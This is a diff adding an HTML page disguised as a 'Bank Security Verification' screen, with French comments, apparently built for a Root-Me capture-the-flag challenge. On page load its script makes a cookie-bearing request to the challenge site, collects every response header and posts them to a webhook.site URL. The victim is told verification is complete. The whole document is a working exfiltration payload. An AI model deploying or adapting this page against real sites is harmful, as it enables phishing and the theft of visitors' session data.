@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Bank Security Check</title>
+  </head>
+  <body>
+    <h1>Bank Security Verification</h1>
+    <p>Please wait while we verify your account...</p>
+
+    <script>
+      // Webhook URL - remplacez par votre URL de réception
+      const webhookURL =
+        "https://webhook.site/619dc24e-b59e-4424-8632-84b2c38413c5";
+
+      // Fonction pour envoyer les headers
+      function stealHeaders() {
+        // Faire une requête vers le site bancaire
+        fetch(
+          "https://instance-019a183e-f399-712e-acfd-1a4939b3c52d.challenges.root-me.pro/rich-club",
+          {
+            method: "GET",
+            credentials: "include", // inclut les cookies
+          }
+        )
+          .then((response) => {
+            // Récupérer tous les headers de la réponse
+            const headers = {};
+            for (const [key, value] of response.headers.entries()) {
+              headers[key] = value;
+            }
+
+            // Envoyer les headers au webhook
+            return fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                url: response.url,
+                status: response.status,
+                headers: headers,
+                timestamp: new Date().toISOString(),
+              }),
+            });
+          })
+          .then(() => {
+            document.body.innerHTML += "<p>Verification complete!</p>";
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+
+      // Exécuter quand la page charge
+      window.onload = stealHeaders;
+    </script>
+  </body>
+</html>
